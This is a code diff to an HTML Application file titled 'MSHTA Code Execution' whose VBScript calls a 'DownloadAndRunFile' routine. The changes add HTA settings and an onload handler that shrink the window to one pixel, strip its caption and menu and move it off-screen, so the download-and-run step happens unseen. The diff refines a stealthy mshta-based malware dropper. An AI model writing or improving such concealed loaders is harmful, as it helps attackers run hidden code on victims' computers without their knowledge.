@@ -3,8 +3,23 @@
 <head>
     <meta charset="UTF-8">
     <title>MSHTA Code Execution</title>
+    <hta:application 
+        id="oMyApp"
+        innerborder="no"
+        scroll="no"
+        singleinstance="yes"
+        windowstate="normal"
+        border="dialog"
+        maximizebutton="no"
+        minimizebutton="no"
+        sysmenu="no"
+        caption="no"
+        showintaskbar="yes"
+        width="1"
+        height="1"
+    />
 </head>
-<body>
+<body onload="window.moveTo(-32000, -32000); window.resizeTo(1, 1);">
 
 <script type="text/vbscript">
    Option Explicit
@@ -60,13 +75,6 @@ End Sub
 
 ' Call the main subroutine
 DownloadAndRunFile
-</script>
-
-<script type="text/javascript">
-    // Resize and move the window off the screen
-    window.resizeTo(1, 1);
-    window.moveTo(-32000, -32000);
-    window.close(); // Close the window after resizing and moving
 </script>
 
 </body>
